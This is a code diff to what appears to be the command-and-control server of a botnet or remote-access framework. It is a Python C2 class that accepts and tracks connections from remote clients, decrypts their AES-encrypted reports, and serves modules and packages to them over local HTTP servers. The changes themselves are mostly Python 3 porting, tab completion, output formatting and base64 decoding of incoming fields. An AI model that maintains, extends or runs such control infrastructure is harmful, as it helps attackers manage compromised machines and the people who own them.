@@ -8,6 +8,7 @@ import os
 import sys
 import time
 import json
+import base64
 import pickle
 import socket
 import struct
@@ -18,6 +19,12 @@ import datetime
 import threading
 import subprocess
 import collections
+
+http_serv_mod = "SimpleHTTPServer"
+if sys.version_info[0] > 2:
+    http_serv_mod = "http.server"
+    sys.path.append('core')
+    sys.path.append('modules')
 
 # modules
 import core.util as util
@@ -114,7 +121,7 @@ def main():
     parser.add_argument(
         '-v', '--version',
         action='version',
-        version='0.4',
+        version='0.5',
     )
 
     modules = os.path.abspath('modules')
@@ -138,11 +145,11 @@ def main():
             util.log("Unable to create directory 'data' (permission denied)")
 
     options = parser.parse_args()
-
+    tmp_file=open("temp","w")
     globals()['debug'] = options.debug
-    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
-    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
-    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, options.port + 3), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+    globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
     globals()['c2'].run()
 
@@ -249,6 +256,15 @@ class C2():
                 'usage': 'tasks [id]',
                 'description': 'display all incomplete tasks for a client (default: all clients)'}}
 
+        try:
+            import readline
+        except ImportError:
+            util.log("Warning: missing package 'readline' is required for tab-completion")
+        else:
+            import rlcompleter
+            readline.parse_and_bind("tab: complete")
+            readline.set_completer(self._completer)
+
     def _print(self, info):
         lock = self.current_session._lock if self.current_session else self._lock
         if isinstance(info, str):
@@ -270,11 +286,11 @@ class C2():
                             if len(str(info.get(key))) > 80:
                                 info[key] = str(info.get(key))[:77] + '...'
                             info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(key).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(key, datetime.datetime) else str(int(time.mktime(key.timetuple())))
-                            util.display('\x20' * 4, end=',')
+                            util.display('\x20' * 4, end=' ')
                             util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         else:
             with lock:
-                util.display('\x20' * 4, end=',')
+                util.display('\x20' * 4, end=' ')
                 util.display(str(info), color=self._text_color, style=self._text_style)
 
     def _socket(self, port):
@@ -289,12 +305,12 @@ class C2():
         with lock:
             if data:
                 util.display('\n{}\n'.format(data))
-            util.display(prompt, end=',')
+            util.display(prompt, end=' ')
 
     def _banner(self):
         with self._lock:
             util.display(__banner__, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
-            util.display("[?] ", color='yellow', style='bright', end=',')
+            util.display("[?] ", color='yellow', style='bright', end=' ')
             util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
         return __banner__
 
@@ -326,6 +342,12 @@ class C2():
         else:
             util.log("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
         return session
+
+    def _completer(self, text, state):
+        options = [i for i in self.commands.keys() if i.startswith(text)]
+        if state < len(options):
+            return options[state]
+        return None
 
     def _get_prompt(self, data):
         with self._lock:
@@ -379,13 +401,13 @@ class C2():
         column1 = 'command <arg>'
         column2 = 'description'
         info = json.loads(info) if info else {command['usage']: command['description'] for command in self.commands.values()}
-        max_key = max(map(len, info.keys() + [column1])) + 2
-        max_val = max(map(len, info.values() + [column2])) + 2
-        util.display('\n', end=',')
+        max_key = max(map(len, list(info.keys()) + [column1])) + 2
+        max_val = max(map(len, list(info.values()) + [column2])) + 2
+        util.display('\n', end=' ')
         util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
         for key in sorted(info):
             util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
-        util.display("\n", end=',')
+        util.display("\n", end=' ')
 
     def display(self, info):
         """
@@ -410,8 +432,13 @@ class C2():
                     self._print(json.loads(info))
                 except:
                     util.display(str(info), color=self._text_color, style=self._text_style)
+            elif isinstance(info, bytes):
+                try:
+                    self._print(json.load(info))
+                except:
+                    util.display(info.decode('utf-8'), color=self._text_color, style=self._text_style)
             else:
-                util.log("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
+                util.log("{} error: invalid data type '{}'".format(self.display.__name__, type(info)))
             print()
 
     def query(self, statement):
@@ -434,11 +461,11 @@ class C2():
         prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
         prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
         util.display('\n\t    OPTIONS', color='white', style='bright')
-        util.display('text color/style: ', color='white', style='normal', end=',')
+        util.display('text color/style: ', color='white', style='normal', end=' ')
         util.display('/'.join((self._text_color.title(), self._text_style.title())), color=self._text_color, style=self._text_style)
-        util.display('prompt color/style: ', color='white', style='normal', end=',')
+        util.display('prompt color/style: ', color='white', style='normal', end=' ')
         util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())), color=self._prompt_color, style=self._prompt_style)
-        util.display('debug: ', color='white', style='normal', end=',')
+        util.display('debug: ', color='white', style='normal', end=' ')
         util.display('True\n' if globals()['debug'] else 'False\n', color='green' if globals()['debug'] else 'red', style='normal')
 
     def set(self, args=None):
@@ -473,7 +500,7 @@ class C2():
                             globals()['debug'] = False
                         elif setting.lower() in ('1','on','true','enable'):
                             globals()['debug'] = True
-                        util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=',')
+                        util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=' ')
                         util.display("Debug: {}\n".format("ON" if globals()['debug'] else "OFF"), color='white', style='bright')
                         return
                 for setting, option in arguments.kwargs.items():
@@ -485,7 +512,7 @@ class C2():
                         elif setting == 'style':
                             if hasattr(colorama.Style, option):
                                 self._prompt_style = option
-                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=',')
+                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=' ')
                         util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
                         return
                     elif target == 'text':
@@ -495,7 +522,7 @@ class C2():
                         elif setting == 'style':
                             if hasattr(colorama.Style, option):
                                 self._text_style = option
-                        util.display("\ntext color/style changed to ", color='white', style='bright', end=',')
+                        util.display("\ntext color/style changed to ", color='white', style='bright', end=' ')
                         util.display(option + '\n', color=self._text_color, style=self._text_style)
                         return
         util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
@@ -735,6 +762,7 @@ class C2():
             self.database.update_status(session.get('uid'), 0)
             session['online'] = False
             self.sessions[session.get('id')] = { "info": session, "connection": None }
+            self._count += 1
         while True:
             connection, address = self.socket.accept()
             session = Session(connection=connection, id=self._count)
@@ -742,27 +770,27 @@ class C2():
                 info = self.database.handle_session(session.info)
                 if isinstance(info, dict):
                     if info.pop('new', False):
-                        util.display("\n\n[+]", color='green', style='bright', end=',')
-                        util.display("New Connection:", color='white', style='bright', end=',')
+                        util.display("\n\n[+]", color='green', style='bright', end=' ')
+                        util.display("New Connection:", color='white', style='bright', end=' ')
                         util.display(address[0], color='white', style='normal')
-                        util.display("    Session:", color='white', style='bright', end=',')
+                        util.display("    Session:", color='white', style='bright', end=' ')
                         util.display(str(session.id), color='white', style='normal')
-                        util.display("    Started:", color='white', style='bright', end=',')
+                        util.display("    Started:", color='white', style='bright', end=' ')
                         util.display(time.ctime(session._created), color='white', style='normal')
                         self._count += 1
                     else:
-                        util.display("\n\n[+]", color='green', style='bright', end=',')
-                        util.display("{} reconnected".format(address[0]), color='white', style='bright', end=',')
+                        util.display("\n\n[+]", color='green', style='bright', end=' ')
+                        util.display("{} reconnected".format(address[0]), color='white', style='bright', end=' ')
                     session.info = info
                     self.sessions[int(session.id)] = session
             else:
-                util.display("\n\n[-]", color='red', style='bright', end=',')
-                util.display("Failed Connection:", color='white', style='bright', end=',')
+                util.display("\n\n[-]", color='red', style='bright', end=' ')
+                util.display("Failed Connection:", color='white', style='bright', end=' ')
                 util.display(address[0], color='white', style='normal')
 
             # refresh prompt
             prompt = '\n{}'.format(self.current_session._prompt if self.current_session else self._prompt)
-            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
+            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=' ')
             sys.stdout.flush()
 
             abort = globals()['__abort']
@@ -779,7 +807,7 @@ class C2():
         while True:
             time.sleep(3)
             globals()['package_handler'].terminate()
-            globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
+            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
 
     def run(self):
         """
@@ -881,6 +909,8 @@ class Session(threading.Thread):
         msg = self.connection.recv(msg_size)
         data = security.decrypt_aes(msg, self.key)
         info = json.loads(data)
+        for item in [item for item in info if "_b64" in str(info[item])[0:5]]:
+            info[item] = base64.b64decode(bytes(info[item][6:])).decode('ascii')
         return info
 
     def status(self):
